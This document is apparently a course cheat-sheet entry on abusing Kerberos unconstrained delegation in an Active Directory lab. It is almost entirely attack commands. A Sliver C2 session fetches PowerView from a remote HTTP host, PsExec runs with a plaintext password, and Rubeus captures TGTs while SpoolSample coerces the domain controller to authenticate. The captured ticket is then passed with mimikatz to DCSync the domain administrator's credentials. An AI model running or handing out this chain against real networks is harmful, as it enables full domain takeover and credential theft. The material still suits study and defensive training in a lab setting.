# 15.15 Kerberos Delegation Unconstrained

> On an unconstrained-delegation box, run `Rubeus monitor`, coerce DC auth via SpoolSample, then `kerberos::ptt` the captured TGT for DCSync.

## Overview

Unconstrained delegation machines cache users' TGTs in memory. Compromise the machine, run Rubeus monitor to catch incoming TGTs, then coerce DC authentication with SpoolSample (MS-RPRN abuse). Use the captured DC TGT for DCSync via mimikatz kerberos::ptt.

## Steps

- Enumerate unconstrained delegation hosts: `Get-NetComputer -Unconstrained` via sharpsh.
- From SRV01 (unconstrained), run Rubeus monitor to watch for incoming TGTs.
- Trigger DC01 authentication to SRV01 via SpoolSample `inline-execute-assembly`.
- Save captured TGT base64 to disk as .kirbi: `[System.IO.File]::WriteAllBytes(...)`.
- Import kirbi with mimikatz `kerberos::ptt` and run `lsadump::dcsync` against child\administrator.

## Commands

### Enumerate unconstrained delegation

```text
sliver (psexec-pivot) > sharpsh -- '-u http://<TARGET>:8080/PowerView.ps1 -e -c R2V0LU5ldENvbXB1dGVyIC1VbmNvbnN0cmFpbmVkCg=='
```

### PsExec to SRV01 via Impacket

```bash
proxychains impacket-psexec child/svc_sql:jkhnrjk123\!@<TARGET>
```

### Rubeus monitor on SRV01

```powershell
PS C:\Windows\tasks> .\Rubeus.exe monitor /interval:5 /nowrap
```

### Trigger DC auth via SpoolSample

```text
sliver (psexec-pivot) > inline-execute-assembly /home/htb-ac590/SpoolSample.exe 'dc01 srv01'
```

### Save TGT kirbi to disk

```powershell
PS C:\Windows\system32> [System.IO.File]::WriteAllBytes("C:\windows\temp\dc01.kirbi", [System.Convert]::FromBase64String("doIFJjCCBSKgA <SNIP> Q0hJTEQuSFRCLkxPQ0FMqSQwIqADAgECoRswGRsGa3JidGd0Gw9DSElMRC5IVEIuTE9DQUw="))
```

### Pass ticket + DCSync

```powershell
C:\Windows\Tasks>.\mimikatz.exe "privilege::debug" "kerberos::ptt C:\windows\temp\dc01.kirbi" "lsadump::dcsync /domain:child.htb.local /user:child\administrator" "exit"
```
